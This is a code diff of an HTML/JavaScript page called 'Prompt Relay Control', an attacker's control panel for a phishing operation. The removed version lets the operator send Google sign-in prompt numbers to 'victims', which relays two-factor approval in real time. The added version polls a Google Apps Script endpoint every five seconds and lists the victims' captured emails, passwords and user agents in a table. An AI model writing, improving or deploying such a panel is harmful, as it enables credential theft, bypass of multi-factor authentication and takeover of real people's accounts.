@@ -1,172 +1,217 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Prompt Relay Control</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
+      font-family: system-ui, sans-serif;
       background: #0d1117;
       color: #c9d1d9;
-      padding: 30px;
       margin: 0;
+      padding: 20px;
+      line-height: 1.5;
+    }
+    .container {
+      max-width: 1000px;
+      margin: 0 auto;
     }
     h1 {
-      color: #ff6b6b;
-      margin-bottom: 10px;
-    }
-    p {
-      margin-bottom: 20px;
+      color: #58a6ff;
+      margin-bottom: 0.4em;
     }
     #status {
-      font-size: 18px;
-      margin: 20px 0;
-      color: #58a6ff;
-    }
-    .victim-card {
-      background: #161b22;
-      padding: 20px;
-      border-radius: 8px;
-      margin: 16px 0;
-      border: 1px solid #30363d;
-    }
-    input {
-      padding: 10px;
-      font-size: 20px;
-      width: 80px;
-      text-align: center;
-      background: #0d1117;
-      color: white;
-      border: 1px solid #444;
-      border-radius: 4px;
-    }
-    button {
-      padding: 10px 20px;
-      background: #238636;
-      color: white;
-      border: none;
+      font-size: 1.1rem;
+      padding: 12px 16px;
       border-radius: 6px;
-      cursor: pointer;
-      margin-left: 10px;
+      background: #161b22;
+      border: 1px solid #30363d;
+      margin: 16px 0;
     }
-    button:hover {
-      background: #2ea043;
+    #status.fetching  { background: #21262d; }
+    #status.success   { border-color: #238636; color: #7ee787; }
+    #status.error     { border-color: #da3633; color: #f85149; }
+    #status.empty     { color: #8b949e; }
+
+    #raw-response {
+      margin-top: 24px;
+      padding: 16px;
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 6px;
+      font-family: 'Consolas', 'Courier New', monospace;
+      white-space: pre-wrap;
+      word-break: break-all;
+      max-height: 400px;
+      overflow-y: auto;
+      color: #a5d6ff;
     }
-    .current-number {
-      font-size: 48px;
-      color: #58a6ff;
-      font-weight: bold;
-      margin: 12px 0;
+
+    #victims-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 20px;
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 6px;
     }
-    #victims-container {
-      max-width: 900px;
+    #victims-table th,
+    #victims-table td {
+      padding: 12px 14px;
+      text-align: left;
+      border-bottom: 1px solid #30363d;
+    }
+    #victims-table th {
+      background: #0d1117;
+      color: #8b949e;
+    }
+    #victims-table tr:hover {
+      background: #1f2937;
+    }
+
+    #last-update {
+      color: #8b949e;
+      font-size: 0.9rem;
     }
   </style>
 </head>
 <body>
 
-  <h1>Prompt Relay Control</h1>
-  <p>Enter the number Google shows you on your device.</p>
-  <div id="status">Loading victims...</div>
-  <div id="victims-container"></div>
+  <div class="container">
+    <h1>Prompt Relay Control</h1>
+
+    <div id="status" class="fetching">Fetching victims...</div>
+
+    <div id="raw-response">
+      <strong>Raw response from script (for debugging):</strong><br>
+      (nothing received yet)
+    </div>
+
+    <table id="victims-table" style="display: none;">
+      <thead>
+        <tr>
+          <th>Timestamp</th>
+          <th>Email</th>
+          <th>Status</th>
+          <th>User Agent</th>
+          <th>Password</th>
+        </tr>
+      </thead>
+      <tbody id="victims-body"></tbody>
+    </table>
+
+    <div style="margin-top: 2rem; color: #8b949e; font-size: 0.95rem;">
+      Last update: <span id="last-update">—</span> • Polling every 5 seconds
+    </div>
+  </div>
 
   <script>
-    // ────────────────────────────────────────────────
-    // CHANGE THIS TO YOUR CORRECT /exec URL IF NEEDED
-    // ────────────────────────────────────────────────
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzMcaCzi5Cja5WzhFKhl6O2ypdS8BfWwkyoxIenPP22LjqlMpT0pMbEkUAkiK9ZzZFW/exec";
 
-    function refresh() {
-      document.getElementById("status").textContent = "Fetching victims...";
+    const statusEl     = document.getElementById('status');
+    const rawEl        = document.getElementById('raw-response');
+    const tableEl      = document.getElementById('victims-table');
+    const tbodyEl      = document.getElementById('victims-body');
+    const lastUpdateEl = document.getElementById('last-update');
 
-   fetch(`${SCRIPT_URL}?action=get_victims`, { 
-  mode: 'cors',          // ← Key change: remove no-cors
-  cache: 'no-cache' 
-})
-.then(r => r.text())     // ← Start with .text() instead of .json()
-.then(text => {
-  console.log("Raw response from GAS:", text);  // See what actually comes back
-  try {
-    const data = JSON.parse(text);
-    console.log("Parsed JSON:", data);
-  } catch (e) {
-    console.error("JSON parse failed on:", text, e);
-  }
-})
-.catch(err => console.error("Fetch failed:", err));
+    async function fetchVictims() {
+      statusEl.textContent = "Fetching victims...";
+      statusEl.className = "fetching";
 
+      try {
+        const url = `${SCRIPT_URL}?getVictims=true`;
+        const res = await fetch(url, {
+          cache: 'no-cache',
+          headers: { 'Accept': 'application/json, text/plain, */*' }
+        });
 
+        const text = await res.text();
 
+        // Show raw response no matter what
+        rawEl.innerHTML = `<strong>Raw response from script:</strong><br>${escapeHtml(text || '(empty response)')}`;
 
-        let victims = [];
-        try {
-          victims = JSON.parse(text);
-          console.log("Parsed victims:", victims);
-        } catch (parseErr) {
-          console.error("JSON parse failed");
-          console.error("Parse error:", parseErr);
-          console.error("Raw text that failed:", text);
+        if (!text.trim()) {
+          showEmpty("Empty response from script");
+          return;
         }
 
-        document.getElementById("status").textContent = `Victims found: ${victims.length}`;
+        let data;
+        try {
+          data = JSON.parse(text);
+        } catch (e) {
+          // Not valid JSON → show what we have anyway
+          showRawAsFallback(text);
+          return;
+        }
 
-        document.getElementById("victims-container").innerHTML = victims.length === 0
-          ? "<p>No victims connected yet.</p>"
-          : victims.map(v => `
-              <div class="victim-card">
-                <strong>${v.email || "—"}</strong><br>
-                <small>${new Date(v.timestamp).toLocaleString() || "—"}</small>
-                <div class="current-number">Number: ${v.prompt_number || "—"}</div>
-                <input type="text" id="n-${v.email}" maxlength="2" placeholder="47">
-                <button onclick="set('${v.email}')">Set</button>
-              </div>
-            `).join('');
-      })
-      .catch(err => {
-        console.error("Dashboard fetch failed:", err);
-        console.log("SCRIPT_URL:", SCRIPT_URL);
-        console.log("Navigator online?", navigator.onLine);
-        document.getElementById("status").textContent = "Fetch error – check console";
-      });
-    }
+        // Try common field patterns
+        const victims = data.victims || data.entries || data.data || data || [];
 
-    function set(email) {
-      const input = document.getElementById(`n-${email}`);
-      const val = input.value.trim();
+        if (Array.isArray(victims) && victims.length > 0) {
+          renderVictims(victims);
+        } else {
+          showEmpty("No victims found in response");
+        }
 
-      if (!/^\d{2}$/.test(val)) {
-        alert("Enter exactly 2 digits (10–99)");
-        return;
+      } catch (err) {
+        const msg = err.name === 'TypeError' ? 'Network or CORS issue' : err.message;
+        statusEl.textContent = `Error: ${msg}`;
+        statusEl.className = "error";
+        rawEl.innerHTML += `<br><span style="color:#f85149;">Fetch failed: ${escapeHtml(err.message)}</span>`;
       }
-
-      console.log(`Setting prompt number ${val} for ${email}`);
-
-      fetch(SCRIPT_URL, {
-        method: "POST",
-        headers: { "Content-Type": "text/plain;charset=utf-8" },
-        body: new URLSearchParams({
-          action: "set_number",
-          email: email,
-          prompt_number: val
-        }).toString(),
-        mode: "no-cors"
-      })
-      .then(() => {
-        console.log("Set request sent");
-        alert("Number sent to victim!");
-        refresh(); // refresh list
-      })
-      .catch(err => {
-        console.error("Set number failed:", err);
-        alert("Failed to send number");
-      });
     }
 
-    // Poll every 5 seconds
-    setInterval(refresh, 5000);
-    refresh(); // first load
-  </script>
+    function renderVictims(items) {
+      tbodyEl.innerHTML = '';
+      items.forEach(item => {
+        const tr = document.createElement('tr');
+        tr.innerHTML = `
+          <td>${escapeHtml(item.timestamp || item.time || '—')}</td>
+          <td>${escapeHtml(item.email || '—')}</td>
+          <td>${escapeHtml(item.status || item.Stat || '—')}</td>
+          <td title="${escapeHtml(item.userAgent || '')}">${escapeHtml((item.userAgent || '—').slice(0,70))}</td>
+          <td>${escapeHtml(item.password || item.pass || '—')}</td>
+        `;
+        tbodyEl.appendChild(tr);
+      });
 
+      tableEl.style.display = 'table';
+      statusEl.textContent = `Victims connected: ${items.length}`;
+      statusEl.className = "success";
+      lastUpdateEl.textContent = new Date().toLocaleTimeString();
+    }
+
+    function showEmpty(msg) {
+      statusEl.textContent = msg;
+      statusEl.className = "empty";
+      tableEl.style.display = 'none';
+      lastUpdateEl.textContent = new Date().toLocaleTimeString();
+    }
+
+    function showRawAsFallback(raw) {
+      statusEl.textContent = "Response received but not valid JSON";
+      statusEl.className = "error";
+      rawEl.innerHTML += `<br><br><strong>Fallback view (raw text):</strong><br>${escapeHtml(raw)}`;
+      tableEl.style.display = 'none';
+      lastUpdateEl.textContent = new Date().toLocaleTimeString();
+    }
+
+    function escapeHtml(unsafe) {
+      return unsafe
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#039;");
+    }
+
+    // Start
+    fetchVictims();
+    setInterval(fetchVictims, 5000);
+  </script>
 </body>
 </html>
 
+
+    
